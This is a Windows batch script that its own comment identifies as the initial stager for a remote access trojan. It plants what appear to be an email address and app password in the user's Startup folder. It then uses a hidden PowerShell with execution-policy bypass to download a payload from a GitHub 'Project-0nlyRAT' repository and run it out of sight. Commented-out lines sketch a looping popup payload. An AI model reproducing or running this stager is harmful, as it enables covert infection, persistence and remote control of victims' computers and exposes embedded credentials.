@echo off

@rem initial stager for the rat

set MLrZWNKzXe="defalttests@gmail.com"
set JKgSYUywNCvkasmW="nkos qxgo yxvo brmr"
set CLXduxKZAneOtWBob=%cd%
set hOEiKdgQksaVGwf=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %hOEiKdgQksaVGwf%
echo %MLrZWNKzXe%>KHPWMpTitfZ.txt
echo %JKgSYUywNCvkasmW%>oSyEZsgTWIU.txt

@rem Download payload
powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wLMZNyTDPjiugBO.cmd'"

@rem run the payload
powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wLMZNyTDPjiugBO.cmd"

@rem move back to saved directory
cd %CLXduxKZAneOtWBob%

@REM del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

